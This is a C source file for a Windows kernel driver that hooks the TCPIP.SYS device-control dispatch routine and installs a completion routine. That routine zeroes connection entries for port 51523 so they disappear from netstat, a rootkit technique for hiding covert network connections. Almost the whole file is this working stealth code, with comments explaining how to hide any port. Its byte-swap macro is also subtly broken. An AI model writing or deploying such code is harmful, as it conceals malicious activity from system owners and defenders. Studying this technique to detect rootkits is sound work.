#include "TcpIpDriverHook.h"

#define PORT_TO_HIDE 51523

#define TCP_ENTITY 0x400 // CO_TL_ENTITY
#define UDP_ENTITY 0x401 // CL_TL_ENTITY

#define IOCTL_TCP_QUERY_INFORMATION_EX 0x120003

// structure of an entity ID
typedef struct
{
	unsigned long teiEntity;

	unsigned long teiInstance;
} EntityID;

// structue of an object ID
typedef struct
{
	EntityID toiEntity;

	unsigned long toiClass;

	unsigned long toiType;

	unsigned long outputBufferFormat;
} ObjectID;

typedef struct
{
	void* originalContextData;

	unsigned long outputBufferFormat;

	IO_COMPLETION_ROUTINE* originalCompletionRoutine;
} CompletionRoutineContextData;

// The htons function converts a ushort from host to TCP/IP network byte order (which is big-endian).
#define HTONS(VALUE)                               \
((((VALUE) & 0xFF) << 8) + (((VALUE) & 0xFF) >> 8))

// structures of TCP information buffers returned by TCPIP.sys
typedef struct
{
	unsigned long status;

	unsigned long sourceAddress;

	unsigned short sourcePort;

	unsigned short unknown1;

	unsigned long destinationAddress;

	unsigned short destinationPort;

	unsigned short unknown2;
} ConnectionInformation0x101;

typedef struct
{
	unsigned long status;

	unsigned long sourceAddress;

	unsigned short sourcePort;

	unsigned short unknown1;

	unsigned long destinationAddress;

	unsigned short destinationPort;

	unsigned short unknown2;

	unsigned long processId;
} ConnectionInformation0x102;

typedef struct
{
	unsigned long size;

	unsigned long status;

	unsigned long sourceAddress;

	unsigned short sourcePort;

	unsigned short unknown1;

	unsigned long destinationAddress;

	unsigned short destinationPort;

	unsigned short unknown2;

	unsigned long processId;

	void* unknown3[35];
} ConnectionInformation0x110;

/*
	By parsing the buffer and changing the status value of each structure, you can hide any port you desire.
	Some of the common status values are as follows:

	1 for CLOSED
	2 for LISTENING
	3 for SYN_SENT
	4 for SYN_RECEIVED
	5 for ESTABLISHED
	6 for FIN_WAIT_1
	7 for FIN_WAIT_2
	8 for CLOSE_WAIT
	9 for CLOSING

	If you change the status value to 0, the port disappears from netstat regardless of the parameters.
*/
typedef enum
{
	INVISIBLE    = 0, // meaning netstat.exe isn't showing such connection
	CLOSED       = 1,
	LISTETNING   = 2,
	SYN_SENT     = 3,
	SYN_RECEIVED = 4,
	ESTABLISHED  = 5,
	FIN_WAIT_1   = 6,
	FIN_WAIT_2   = 7,
	CLOSE_WAIT   = 8,
	CLOSING      = 9
} ConnectionStatus;

// Hide connection on the port                                                                                       
#define HIDE_CONNECTION_INFORMATION(REQUEST_TYPE)																					\
do																																	\
{																								   									\
	unsigned long outputBuffersCount = irp->IoStatus.Information / sizeof(ConnectionInformation##REQUEST_TYPE);					\
																																	\
	for(unsigned long i = 0; i < outputBuffersCount; i++)																			\
		if(HTONS(((ConnectionInformation##REQUEST_TYPE*)outputBuffer)[i].destinationPort) == PORT_TO_HIDE)							\
			RtlZeroMemory(&((ConnectionInformation##REQUEST_TYPE*)outputBuffer)[i], sizeof(ConnectionInformation##REQUEST_TYPE));	\
}while(0)

// CRCD - Completion Routine Context Data
#define COMPLETION_ROUTINE_CONTEXT_DATA_POOL_TAG 'CRCD'

static NTSTATUS completionRoutine(DEVICE_OBJECT* deviceObject, IRP* irp, CompletionRoutineContextData* contextData)
{
	DbgPrint("Inside completionRoutine. ContextData = 0x%X\n", contextData);
	
	void* outputBuffer = irp->UserBuffer;

	if(contextData->outputBufferFormat == 0x101)
		HIDE_CONNECTION_INFORMATION(0x101);
	else if(contextData->outputBufferFormat == 0x102)
		HIDE_CONNECTION_INFORMATION(0x102);
	else if(contextData->outputBufferFormat == 0x110)
		HIDE_CONNECTION_INFORMATION(0x110);

	IO_COMPLETION_ROUTINE* originalCompletionRoutine = contextData->originalCompletionRoutine;

	ExFreePoolWithTag(contextData, COMPLETION_ROUTINE_CONTEXT_DATA_POOL_TAG);

	DbgPrint("Original completion routine = 0x%X\n", originalCompletionRoutine);

	if(originalCompletionRoutine && irp->StackCount > 1)
		return originalCompletionRoutine(deviceObject, irp, NULL);

	return irp->IoStatus.Status;
}

static DRIVER_DISPATCH* originalDispatchDeviceControl = NULL;

static NTSTATUS dispatchDeviceControlHook(DEVICE_OBJECT* deviceObject, IRP* irp)
{
	// Get a pointer to the current location in the IRP.
	// This is where the function codes and parameters are located
	/*
		Think of the stack locations in a PIRP as replacements for arguments placed
		on the stack when you make a function call. IoGetCurrentIrpStackLocation will
		give you your arguments, IoGetNextIrpStackLocation will let you set the arguments
		for the driver that you are going to send the PIRP to
	*/
	IO_STACK_LOCATION* ioStackLocation = IoGetCurrentIrpStackLocation(irp);

	DbgPrint("Inside hook. ioStackLocation->MajorFunction = 0x%X, ControlCode = 0x%X\n", ioStackLocation->MajorFunction, ioStackLocation->Parameters.DeviceIoControl.IoControlCode);

	if(ioStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL && ioStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX)
	{
		// Type3InputBuffer most likely means input buffer for a communication method between a program and a driver with the number 3, so METOD_NEITHER
		ObjectID* inputBuffer = ioStackLocation->Parameters.DeviceIoControl.Type3InputBuffer;

		DbgPrint("Minor function = 0x%X (should be 0). OutputBufferFormat = 0x%x\n", ioStackLocation->MinorFunction, inputBuffer->outputBufferFormat);
				
		if(inputBuffer->toiEntity.teiEntity == TCP_ENTITY)
			if(inputBuffer->outputBufferFormat == 0x101 || inputBuffer->outputBufferFormat == 0x102 || inputBuffer->outputBufferFormat == 0x110)
			{
				// Call our completion routine if IRP succeeds.
				// To do this, change the Control flags in the IRP
				ioStackLocation->Control = SL_INVOKE_ON_SUCCESS;

				// save old completion routine if present
				ioStackLocation->Context = ExAllocatePoolWithTag(NonPagedPool, sizeof(CompletionRoutineContextData), COMPLETION_ROUTINE_CONTEXT_DATA_POOL_TAG);

				CompletionRoutineContextData* completionRoutineContextData = ioStackLocation->Context;

				DbgPrint("ContextData = 0x%X, outputBufferFormat = 0x%x\n", completionRoutineContextData, inputBuffer->outputBufferFormat);

				completionRoutineContextData->outputBufferFormat = inputBuffer->outputBufferFormat;
				completionRoutineContextData->originalCompletionRoutine = ioStackLocation->CompletionRoutine;
				
				// Setup our function to be called upon completion of the IRP
				// With this routine in place, after TCPIP.SYS fills in the IRP with
				// information about all the network ports, it will return to your
				// completion routine (because you have wedged it into the original IRP).
				ioStackLocation->CompletionRoutine = completionRoutine;
			}
	}
	
	// call the original function
	return originalDispatchDeviceControl(deviceObject, irp);
}

#define TCP_IP_DRIVER_DEVICE_PATH L"\\Device\\Tcp"

// Calls to DeviceIoControl cause the I/O manager to create an IRP_MJ_DEVICE_CONTROL request and send it to the topmost driver.
NTSTATUS hookTcpIpDriver()
{	
	UNICODE_STRING tcpIpDriverDevicePath;
	
	RtlInitUnicodeString(&tcpIpDriverDevicePath, TCP_IP_DRIVER_DEVICE_PATH);

	FILE_OBJECT* tcpIpDriverFileObject;
	
	DEVICE_OBJECT* tcpIpDriverDeviceObject;
	
	NTSTATUS status = IoGetDeviceObjectPointer(&tcpIpDriverDevicePath, FILE_READ_DATA, &tcpIpDriverFileObject, &tcpIpDriverDeviceObject);

	if(!NT_SUCCESS(status))
	{
		DbgPrint("IoGetDeviceObjectPointer failed with code 0x%X\n", status);

		return status;
	}
	
	originalDispatchDeviceControl = tcpIpDriverDeviceObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
	
	if(!originalDispatchDeviceControl)
	{
		DbgPrint("originalDispatchDeviceControl is NULL!\n");

		return STATUS_UNSUCCESSFUL;
	}

	// When this code is executed, your hook is installed in the TCPIP.SYS driver
	InterlockedExchange(&tcpIpDriverDeviceObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], dispatchDeviceControlHook);
	
	DbgPrint("Successfully hooked: originalDeviceControl = 0x%X, deviceObject = 0x%X, driverObject = 0x%X\n", originalDispatchDeviceControl, tcpIpDriverDeviceObject, tcpIpDriverDeviceObject->DriverObject);

	return STATUS_SUCCESS;
}
